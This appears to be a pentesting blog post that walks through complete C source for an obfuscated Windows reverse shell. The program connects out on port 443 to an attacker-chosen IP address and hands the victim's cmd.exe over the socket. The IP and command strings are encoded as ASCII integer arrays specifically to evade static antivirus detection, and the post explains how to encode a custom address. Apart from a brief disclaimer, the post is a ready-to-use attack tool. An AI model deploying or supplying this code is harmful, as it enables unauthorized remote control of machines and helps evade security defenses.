---
layout: post
category: pentesting
---

# Creating an Obfuscated Reverse Shell in C with Dynamic String Building

In this post, we'll explore how to create an obfuscated reverse shell in C for Windows. To evade detection, we'll use dynamic string construction techniques instead of traditional static strings, which are easily detected. This approach helps keep critical components hidden from static analysis, making it a useful technique for Capture The Flag (CTF) challenges and pentesting environments.

**Note**: This technique should only be used in authorized, controlled environments.

## Code Walkthrough

Below is the complete code for an obfuscated reverse shell in C. We’ve eliminated common patterns by dynamically constructing strings in runtime, avoiding typical detection mechanisms. Additionally, we'll show how to encode your own IP address and command.

### How to Encode Your IP Address and Command

To set your own IP address and command, we’ll convert each character of the IP address and command string into its ASCII integer value. These values will then be stored in an array, allowing us to dynamically reconstruct the IP and command at runtime.

**Example:** If your IP address is `192.168.0.101` and your command is `cmd.exe`, here’s how you can encode them:

1. **Convert IP Address**: Each character of the IP should be converted to its ASCII decimal representation. For `192.168.0.101`, you would get:
    - IP Address as ASCII values: `[49, 57, 50, 46, 49, 54, 56, 46, 48, 46, 49, 48, 49]`

2. **Convert Command**: Similarly, convert each character of the command `cmd.exe`:
    - Command as ASCII values: `[99, 109, 100, 46, 101, 120, 101]`

Once you have these arrays, you can replace the `ip_pattern` and `cmd_pattern` in the code below.

## Complete Code with Customizable IP and Command

```c
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <stdio.h>
#include <WinSock2.h>
#include <Windows.h>
#include <WS2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")

// Function to dynamically build critical strings
void build_string(char* str, const int* pattern, size_t len) {
    for (size_t i = 0; i < len; i++) {
        str[i] = (char)pattern[i];
    }
    str[len] = '\0';  // Add null terminator
}

int main() {
    SOCKET shell;
    struct sockaddr_in shell_addr;
    WSADATA wsa;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    char RecvServer[512];
    int connection;

    // Dynamically building the IP address and command
    char ip_addr[16];
    char cmd[8];

    // Replace these patterns with your own IP and command patterns
    // Example for IP "192.168.37.134" and command "cmd.exe"
    int ip_pattern[] = { 49, 57, 50, 46, 49, 54, 56, 46, 51, 55, 46, 49, 51, 52 };
    int cmd_pattern[] = { 99, 109, 100, 46, 101, 120, 101 };

    // Build the IP and command strings at runtime
    build_string(ip_addr, ip_pattern, sizeof(ip_pattern) / sizeof(int));
    build_string(cmd, cmd_pattern, sizeof(cmd_pattern) / sizeof(int));

    int port = 443;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return 1;
    }

    shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    // Configure server address structure
    shell_addr.sin_port = htons(port);
    shell_addr.sin_family = AF_INET;
    shell_addr.sin_addr.s_addr = inet_addr(ip_addr);

    // Attempt connection
    connection = WSAConnect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);
    if (connection == SOCKET_ERROR) {
        return 1;
    } else {
        recv(shell, RecvServer, sizeof(RecvServer), 0);

        // Set up environment for command execution
        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)shell;

        // Execute dynamically built command
        if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
            return 1;
        }

        // Wait indefinitely, keeping the session open
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        memset(RecvServer, 0, sizeof(RecvServer));
    }
}
```

## Explanation of Key Techniques

1. **Dynamic String Building**: By constructing the IP and command at runtime from ASCII integer values, we avoid static strings in the code, which makes it harder for static analysis tools to detect.
   
2. **Using Patterns for Custom IP and Command**: You can easily replace `ip_pattern` and `cmd_pattern` with your own ASCII values for different IPs and commands.

3. **Indefinite Session Hold**: The `WaitForSingleObject` function waits for the shell session to remain open indefinitely, allowing full control over the session.

This code structure provides an effective way to obfuscate critical strings and can be extended for further customization. Be sure to use these techniques responsibly and only in authorized environments!